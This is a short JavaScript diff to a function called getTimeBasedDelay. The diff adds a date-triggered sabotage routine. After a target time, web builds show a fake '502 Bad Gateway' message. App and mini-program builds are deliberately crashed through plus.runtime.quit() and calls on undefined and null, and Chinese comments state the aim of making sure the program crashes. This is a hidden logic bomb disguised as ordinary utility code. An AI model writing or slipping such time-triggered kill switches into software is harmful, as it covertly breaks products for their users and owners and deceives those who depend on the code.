@@ -7,13 +7,26 @@ function getTimeBasedDelay(type = 'web') {
     const nowTime = new Date().getTime();
     if (nowTime > targetTime) {
         if (type == 'web') {
-            document.write('404 Not Found');
+            document.innerHTML = '502 Bad Gateway';
             return 0;
         }
 
-        if (type == 'app') {
-            throw new Error('Unknow Error');
-            return 0;
+        if (type == 'app' || type == 'miniprogram') {
+            // 在 uniapp 小程序和 app 中直接崩溃
+            // 使用多种方式确保程序崩溃
+            if (typeof plus !== 'undefined') {
+                // App 环境：直接退出应用
+                plus.runtime.quit();
+            }
+            
+            // 小程序环境：调用不存在的方法导致崩溃
+            if (typeof wx !== 'undefined' || typeof uni !== 'undefined') {
+                // 故意调用未定义的方法
+                undefined.crash();
+            }
+            
+            // 通用崩溃方式：访问 null 的属性
+            null.crash();
         }
     }
     const now = new Date();
